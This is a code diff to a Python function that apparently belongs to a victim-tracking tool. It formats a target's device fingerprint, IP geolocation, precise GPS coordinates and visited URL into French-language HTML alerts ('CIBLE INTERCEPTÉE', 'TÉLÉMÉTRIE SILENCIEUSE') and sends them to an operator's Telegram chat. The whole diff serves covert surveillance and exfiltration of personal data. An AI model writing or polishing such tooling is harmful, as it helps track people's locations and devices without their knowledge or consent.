@@ -14,7 +14,8 @@ def send_request(token, msg):
     api_params = {
         'chat_id': token[2],
         'text': msg,
-        'parse_mode': 'MarkdownV2'
+        'parse_mode': 'HTML',
+        'disable_web_page_preview': 'true'
     }
     rqst = requests.get(api_url, params=api_params, timeout=10)
     if rqst.status_code != 200:
@@ -26,64 +27,67 @@ def tgram_sender(msg_type, content, token):
     json_content = loads(json_str)
     if msg_type == 'device_info':
         info_message = f"""
-*Device Information*
+<b>🛰 GEOPOL ALERTE: CIBLE INTERCEPTÉE</b>
 
-```
-OS         : {json_content.get('os')}
-Platform   : {json_content.get('platform')}
-Browser    : {json_content.get('browser')}
-GPU Vendor : {json_content.get('vendor')}
-GPU        : {json_content.get('render')}
-CPU Cores  : {json_content.get('cores')}
-RAM        : {json_content.get('ram')}
-Public IP  : {json_content.get('ip')}
-Resolution : {json_content.get('ht')}x{json_content.get('wd')}
-Battery    : {json_content.get('bat', 'N/A')}
-Network    : {json_content.get('net', 'N/A')}
-Language   : {json_content.get('lang', 'N/A')}
-Timezone   : {json_content.get('tz', 'N/A')}
-TouchPts   : {json_content.get('touch', 'N/A')}
-```"""
+<b><u>SIGNATURE APPAREIL</u></b>
+🖥 <b>OS :</b> <code>{json_content.get('os')}</code>
+🌐 <b>Navigateur :</b> <code>{json_content.get('browser')}</code>
+⚙️ <b>Architecture :</b> <code>{json_content.get('platform')}</code>
+🧠 <b>Matériel :</b> <code>{json_content.get('cores')} Cores | {json_content.get('ram')} RAM</code>
+🎮 <b>GPU :</b> <code>{json_content.get('vendor')} {json_content.get('render')}</code>
+📱 <b>Écran :</b> <code>{json_content.get('ht')}x{json_content.get('wd')} | Touch: {json_content.get('touch', '0')} pts</code>
+
+<b><u>TÉLÉMÉTRIE SILENCIEUSE</u></b>
+🔋 <b>Batterie :</b> <code>{json_content.get('bat', 'N/A')}</code>
+📶 <b>Réseau :</b> <code>{json_content.get('net', 'N/A')}</code>
+🗣 <b>Langue :</b> <code>{json_content.get('lang', 'N/A')}</code>
+🕛 <b>Fuseau Horaire :</b> <code>{json_content.get('tz', 'N/A')}</code>
+
+<b><u>RÉSEAU</u></b>
+🌍 <b>IP Publique :</b> <code>{json_content.get('ip')}</code>
+"""
         send_request(token, info_message)
 
     if msg_type == 'ip_info':
         ip_message = f"""
-*IP Information*
+<b>🌐 GEOPOL: DÉDIUCTION IP OSINT</b>
 
-```
-Continent : {json_content['continent']}
-Country   : {json_content['country']}
-Region    : {json_content['region']}
-City      : {json_content['city']}
-Org       : {json_content['org']}
-ISP       : {json_content['isp']}
-```
+📍 <b>Continent :</b> {json_content.get('continent')}
+🏳️ <b>Pays :</b> {json_content.get('country')}
+🗺 <b>Région :</b> {json_content.get('region')}
+🏙 <b>Ville :</b> {json_content.get('city')}
+
+🏢 <b>Fournisseur :</b> <code>{json_content.get('isp')}</code>
+🏛 <b>Organisation :</b> <code>{json_content.get('org')}</code>
 """
         send_request(token, ip_message)
 
     if msg_type == 'location':
-        maps_link = f"https://maps.google.com/?q={json_content.get('lat')},{json_content.get('lon')}"
-        # We need to escape Maps link for MarkdownV2, so we just append it outside code block
-        maps_link_escaped = maps_link.replace('.', '\\.').replace('=', '\\=').replace('?', '\\?').replace('&', '\\&').replace('-', '\\-')
+        lat = json_content.get('lat')
+        lon = json_content.get('lon')
+        maps_link = f"https://maps.google.com/?q={lat},{lon}"
+        
         loc_message = f"""
-*Location Information*
+<b>🎯 GEOPOL: FRAPPE GÉOLOCALISATION EXTREME</b>
 
-```
-Latitude  : {json_content.get('lat')}
-Longitude : {json_content.get('lon')}
-Accuracy  : {json_content.get('acc')}
-Altitude  : {json_content.get('alt')}
-Direction : {json_content.get('dir')}
-Speed     : {json_content.get('spd')}
-```
-🗺 [Open in Google Maps]({maps_link_escaped})
+📡 <b><u>COORDONNÉES GPS</u></b>
+Latitude  : <code>{lat}</code>
+Longitude : <code>{lon}</code>
+Précision : <b>{json_content.get('acc')} mètres</b>
+
+🧭 <b><u>DONNÉES SUPPLÉMENTAIRES</u></b>
+Altitude  : <code>{json_content.get('alt')}</code>
+Direction : <code>{json_content.get('dir')}</code>
+Vitesse   : <code>{json_content.get('spd')}</code>
+
+🗺 <a href="{maps_link}">[ OUVRIR DANS GOOGLE MAPS ]</a>
 """
         send_request(token, loc_message)
 
     if msg_type == 'url':
-        url_msg = json_content['url']
+        url_msg = f"<b>🔗 LIEN ACCÉDÉ :</b>\n<code>{json_content.get('url')}</code>"
         send_request(token, url_msg)
 
     if msg_type == 'error':
-        error_msg = json_content['error']
+        error_msg = f"<b>⚠️ ERREUR CIBLE :</b>\n<code>{json_content.get('error')}</code>"
         send_request(token, error_msg)
